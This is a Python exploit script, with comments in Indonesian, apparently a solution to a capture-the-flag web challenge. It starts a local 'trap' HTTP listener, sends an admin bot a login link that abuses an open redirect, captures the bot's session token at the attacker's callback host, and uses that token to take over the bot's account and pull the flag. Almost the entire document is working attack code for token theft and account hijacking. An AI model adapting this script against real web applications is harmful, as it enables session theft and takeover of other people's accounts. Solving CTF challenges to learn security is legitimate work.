#!/usr/bin/env python3
import requests
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse
import re
import socket
import time

# --- KONFIGURASI ---
TARGET_URL = "http://localhost:1337"
CALLBACK_PORT = 4444

# Mendeteksi IP Lokal yang bisa diakses oleh Docker
def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # Trik dummy connect untuk dapat IP interface utama
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

CALLBACK_IP = get_local_ip()
# Jika bot gagal connect, GANTI MANUAL IP INI (misal: '192.168.1.x' atau '172.17.0.1')
# CALLBACK_IP = '172.17.0.1' 

print(f"[*] Detected Local IP: {CALLBACK_IP}")
print(f"[*] Callback Server Port: {CALLBACK_PORT}")

stolen_token = None

# Handler untuk Server Jebakan
class MaliciousServer(BaseHTTPRequestHandler):
    def do_GET(self):
        global stolen_token
        # Parse URL buat nyari ?token=...
        query = urllib.parse.urlparse(self.path).query
        params = urllib.parse.parse_qs(query)
        
        if 'token' in params:
            stolen_token = params['token'][0]
            print(f"\n[+] INTERCEPTED! Token received: {stolen_token}")
            
            # Balikin respon sukses ke bot biar sopan
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"You have been hacked. Thank you.")
        else:
            self.send_response(404)
            self.end_headers()
    
    # Biar log ga berisik
    def log_message(self, format, *args):
        return

def start_listener():
    server = HTTPServer(('0.0.0.0', CALLBACK_PORT), MaliciousServer)
    server.handle_request() # Cuma handle 1 request (token) terus mati

def exploit():
    global stolen_token
    
    # 1. Nyalain Server Jebakan
    print(f"[*] Starting Trap Server on {CALLBACK_IP}:{CALLBACK_PORT}...")
    server_thread = threading.Thread(target=start_listener)
    server_thread.start()
    
    # Tunggu bentar biar server up
    time.sleep(1)
    
    # 2. Rakit Payload Open Redirect
    # Format: //IP:PORT/
    # Ini akan dibaca browser sebagai: http://IP:PORT/
    redirect_payload = f"//{CALLBACK_IP}:{CALLBACK_PORT}/"
    
    # URL yang dikirim ke Bot
    malicious_link = f"{TARGET_URL}/login?redirect={redirect_payload}"
    
    print(f"[*] Sending malicious link to Bot Markonah...")
    print(f"    Payload: {malicious_link}")
    
    # 3. Kirim ke Bot
    try:
        r = requests.post(f"{TARGET_URL}/message/send", data={'url': malicious_link})
        if "Message sent" in r.text:
            print("[+] Bot triggered! Waiting for incoming connection...")
        else:
            print("[-] Gagal memancing bot. Cek respon:")
            print(r.text)
            return
    except Exception as e:
        print(f"[-] Connection Error: {e}")
        return

    # 4. Tunggu Token Masuk
    server_thread.join(timeout=10)
    
    if stolen_token:
        print(f"[+] Token acquired. Hijacking Markonah's account...")
        
        # 5. Akses Dashboard pakai Token curian
        # Dashboard akan menampilkan Secret PIN (Flag)
        r = requests.get(f"{TARGET_URL}/dashboard?token={stolen_token}")
        
        if "Secret PIN" in r.text:
            # Cari Flag pwn{...} pakai Regex
            flag = re.search(r'pwn\{.*?\}', r.text)
            
            print("-" * 50)
            if flag:
                print(f"[!!!] JACKPOT! FLAG: {flag.group(0)}")
            else:
                print("[-] Flag format not detected. Dumping raw content:")
                print(r.text[:500]) # Print 500 char pertama
            print("-" * 50)
        else:
            print("[-] Dashboard accessed, but Secret PIN not found.")
    else:
        print("\n[-] Timeout! Bot tidak menghubungi server kita.")
        print("    Tips: Pastikan 'CALLBACK_IP' bisa diakses dari dalam Docker Container.")
        print("    Coba ganti CALLBACK_IP dengan IP dari 'ip addr show docker0'")

if __name__ == "__main__":
    exploit()
